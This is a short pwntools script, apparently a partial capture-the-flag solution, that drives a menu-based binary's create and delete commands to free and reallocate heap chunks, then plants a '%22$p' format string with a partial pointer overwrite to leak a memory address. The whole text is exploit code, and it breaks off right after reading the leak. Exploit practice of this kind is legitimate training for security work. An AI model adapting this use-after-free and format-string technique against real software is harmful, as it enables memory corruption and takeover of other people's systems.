from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
    
def add(size,content):
    io.sendlineafter('3.quit','create ')
    io.sendlineafter('size:',str(size + 1))
    io.sendafter('str:',content + '\x00')
    
def delete(index):
    io.sendlineafter('3.quit','delete ')
    io.sendlineafter('id:',str(index))
    io.sendlineafter('Are you sure?:','yes')
    
def exploit():
    add(0x10,'a'*0x10) #0
    add(0x10,'b'*0x10) #1
    delete(1)
    delete(0)
    add(0x20,'%22$p'.ljust(0x18,'b') + p16(0x58C0)) #0
    delete(1)
    io.recvuntil('0x')
